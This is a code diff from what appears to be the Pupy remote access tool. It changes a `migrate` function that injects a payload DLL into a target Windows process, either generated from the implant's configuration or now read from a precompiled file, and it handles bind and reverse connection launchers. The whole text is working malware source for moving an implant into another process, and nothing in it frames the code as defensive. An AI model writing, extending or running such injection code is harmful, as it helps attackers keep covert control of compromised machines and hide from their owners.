@@ -8,11 +8,12 @@ def has_proc_migrated(client, pid):
                 return c
     return None
 
-def migrate(module, pid, keep=False, timeout=30, bindPort=None, debug=False):
+def migrate(module, pid, keep=False, timeout=30, bindPort=None, debug=False, from_payload=None):
     '''
     - bindPort: The port used for listening on the target WHEN the current launcher uses a BIND connection.
                 When the current launcher uses a BIND connection, this session is kept even if keep==False
-                When bindPort!=None and the current launcher uses a REVERSE connection (e.g. connect, auto_proxy), bindPort is not used in this function
+                When bindPort!=None and the current launcher uses a REVERSE connection (e.g. connect, auto_proxy),
+                bindPort is not used in this function
     '''
     module.client.load_package('pupwinutils.processes')
     isProcess64bits = False
@@ -32,25 +33,34 @@ def migrate(module, pid, keep=False, timeout=30, bindPort=None, debug=False):
         arch ='x86'
         module.success("process is 32 bits")
 
-    conf = module.client.get_conf()
+    dllbuff = None
+    if from_payload:
+        with open(from_payload, 'rb') as payload:
+            dllbuff = payload.read()
 
-    #Manage when current launcher uses a BIND connection (and not a REVERSE connection)
-    if module.client.desc['launcher'] not in ('connect', 'auto_proxy'):
         keep = True
-        module.warning('Enable keep (forced)')
+        module.success('Precompiled payload: {}'.format(from_payload))
+    else:
+        conf = module.client.get_conf()
 
-    if module.client.desc['launcher'] == "bind":
-        isBindConnection = True
-        module.success("the current launcher uses a bind connection")
-        module.success("the bind port {0} is defined in DLL configuration".format(bindPort))
-        conf['launcher_args'][conf['launcher_args'].index("--port")+1] = str(bindPort)
+        #Manage when current launcher uses a BIND connection (and not a REVERSE connection)
+        if module.client.desc['launcher'] not in ('connect', 'auto_proxy'):
+            keep = True
+            module.warning('Enable keep (forced)')
 
-    dllbuff, filename, _ = pupygen.generate_binary_from_template(
-        module.log,
-        conf, 'windows',
-        arch=arch, shared=True, debug=debug
-    )
-    module.success("Template: {}".format(filename))
+        if module.client.desc['launcher'] == "bind":
+            isBindConnection = True
+            module.success("the current launcher uses a bind connection")
+            module.success("the bind port {0} is defined in DLL configuration".format(bindPort))
+            conf['launcher_args'][conf['launcher_args'].index("--port")+1] = str(bindPort)
+
+        dllbuff, filename, _ = pupygen.generate_binary_from_template(
+            module.log,
+            conf, 'windows',
+            arch=arch, shared=True, debug=debug
+        )
+
+        module.success("Template: {}".format(filename))
 
     module.success("injecting DLL in target process %s ..."%pid)
 
